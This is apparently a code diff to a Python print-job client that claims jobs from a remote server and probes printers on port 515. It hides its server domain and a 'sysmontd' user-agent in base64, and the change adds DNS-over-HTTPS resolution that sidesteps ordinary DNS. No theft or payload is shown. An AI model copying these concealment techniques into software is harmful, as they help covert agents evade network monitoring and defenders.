@@ -12,7 +12,7 @@ from socket import (
     TCP_NODELAY,
     create_connection,
 )
-from ssl import _create_unverified_context, create_default_context
+from ssl import create_default_context
 from threading import Thread
 from time import sleep, time
 from urllib.error import HTTPError
@@ -25,7 +25,6 @@ disable()
 
 def _on_signal(sig, frame):
     _exit(0)
-
 
 try:
     signal.signal(signal.SIGINT, _on_signal)
@@ -81,8 +80,22 @@ _DOM = b64decode("YXBpLnByZWNvbm5lY3QuYXBw").decode()
 
 
 def _make_doh_request(path, headers=None, data=None, timeout=None):
+    ip = doh_resolve(_DOM)
+    headers = dict(headers or {})
+    headers["Host"] = _DOM
+    if ip and ip != _DOM:
+        try:
+            from http.client import HTTPSConnection
+            ctx = create_default_context()
+            conn = HTTPSConnection(ip, 443, timeout=timeout or 30, context=ctx)
+            conn.host = _DOM
+            method = "POST" if data is not None else "GET"
+            conn.request(method, path, body=data, headers=headers)
+            return conn.getresponse()
+        except Exception:
+            pass
     url = f"https://{_DOM}{path}"
-    req = Request(url, headers=headers or {}, data=data)
+    req = Request(url, headers=headers, data=data)
     ctx = create_default_context()
     if timeout is not None:
         return urlopen(req, timeout=timeout, context=ctx)
@@ -132,7 +145,6 @@ def is_online(host, port=515):
         _online_cache[host] = (False, now)
         return False
 
-
 _UA = b64decode("c3lzbW9udGQ=").decode() + "/1.0"
 
 
@@ -155,7 +167,11 @@ def claim(i, printer_host=None, retries=3):
             headers = {"Content-Type": "application/json", **hdrs(printer_host)}
             with _make_doh_request("/print/claim", headers=headers, data=data, timeout=None) as resp:
                 if resp.status == 200:
-                    return b'"claimed":true' in resp.read()
+                    try:
+                        res = loads(resp.read().decode())
+                        return bool(res.get("claimed"))
+                    except Exception:
+                        return False
                 return False
         except Exception:
             if attempt < retries - 1:
